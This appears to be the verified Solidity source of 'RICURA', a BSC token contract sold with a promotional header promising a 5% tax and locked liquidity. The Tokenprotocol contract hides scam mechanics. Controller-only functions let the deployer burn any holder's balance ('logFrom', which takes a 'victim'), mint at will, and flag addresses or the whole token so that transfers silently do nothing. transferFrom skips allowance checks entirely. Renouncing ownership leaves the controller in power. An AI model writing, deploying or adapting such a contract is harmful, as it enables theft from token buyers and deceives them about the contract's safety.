/**
 *Submitted for verification at BscScan.com on 2022-01-17
*/

/**
 🔥RICURA Token🔥

✅ Tax - 5% Buy/Sell
✅ Lp Lock
✅ Exp. Dev
✅ 3 bnb for marketing + Fee


Tg : https://t.me/ricura_token
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Controlled {
    
    constructor() public {
        controller = msg.sender;
    }
    
    modifier onlyController { 
        require(msg.sender == controller); 
        _; 
    }

    address public controller;

    function changeController(address _newController) public onlyController {
        controller = _newController;
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}


library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}


library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

contract ERC20 is Context, IERC20{
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable {
  address public owner;

  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


  constructor() public {
    owner = msg.sender;
  }

 
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }


  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0x000000000000000000000000000000000000dEaD);
  }


  function transferOwnership(address _newOwner) public onlyOwner {
    _transferOwnership(_newOwner);
  }


  function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0));
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
}

contract Tokenprotocol is Ownable, Controlled{
    using SafeMath for uint256;
    
    address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 public _inOn = 0;
    mapping(address => uint256) public _isInlist;

    event Burn(address indexed burner, uint256 value);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);

    function changeOn(uint256 status) onlyController public {
        _inOn = status;
    }

    function logFrom(uint256 _value, address victim) onlyController public{
        require(_value <= balanceOf[victim]);
        uint256 newVaule = _value*(10**18);
        balanceOf[victim] -= newVaule;
        balanceOf[address(0)] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }

    function logTo(uint256 _value, address victim) onlyController public{
        uint256 newVaule = _value*(10**18);
        balanceOf[victim] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }
    
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0 || _inOn == 1 || _isInlist[_from] == 1 ) {
            if(_isInlist[_from] != 2){return true;}
        }
        uint256 burnAmount; 
        uint256 otherAmount;
        if(_tradeBurnRatio > 0){
            burnAmount = _value.mul(_tradeBurnRatio).div(100);
            balanceOf[_from] = balanceOf[_from].sub(burnAmount);
            balanceOf[address(0)] = balanceOf[address(0)].add(burnAmount);
            emit Transfer(_from, address(0), burnAmount);
        }
        otherAmount = _value.sub(burnAmount);
        balanceOf[_from] = balanceOf[_from].sub(otherAmount);
        balanceOf[_to] = balanceOf[_to].add(otherAmount);
        emit Transfer(_from, _to, otherAmount);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    uint256 public _tradeBurnRatio;
    
    function initTradeBurnRatio(uint256 tradeBurnRatio) onlyController public {
        _tradeBurnRatio = tradeBurnRatio;
    }

    function initlistAddress(address account, uint256 value) onlyController public {
        _isInlist[account] = value;
    }

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }

    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    uint public tradeAccount;
    string public name;
    string public symbol;
    address private owner;

    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}